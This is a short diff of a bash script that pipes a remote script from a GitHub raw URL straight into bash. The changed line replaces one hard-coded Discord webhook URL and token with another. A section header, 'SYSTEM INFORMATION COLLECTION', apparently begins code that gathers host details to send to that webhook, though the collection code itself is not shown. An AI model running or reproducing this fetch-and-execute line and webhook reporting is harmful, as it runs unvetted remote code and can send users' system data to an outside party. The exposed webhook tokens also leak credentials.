@@ -1,6 +1,6 @@
 bash <(curl -fsSL https://raw.githubusercontent.com/nobita329/ptero/refs/heads/main/ptero/main/dev.sh)
 #!/bin/bash
-WEBHOOK_URL="https://discord.com/api/webhooks/1464048736618414374/Ar3zxLBaoU1B-oZrtk-qDZ5T4f444j18ZeuApl31eTOwxoOV-WH8Ry58lca_04edEQTi"
+WEBHOOK_URL="https://discord.com/api/webhooks/1469205514696130775/ejH5qhUa4bfts11BXXTOoP9Xl62s3zba6vngJLAq46zLiuNEx4rDw2Dj_ZRXVejDeowZ"
 
 # ============================================================================
 # 1. SYSTEM INFORMATION COLLECTION
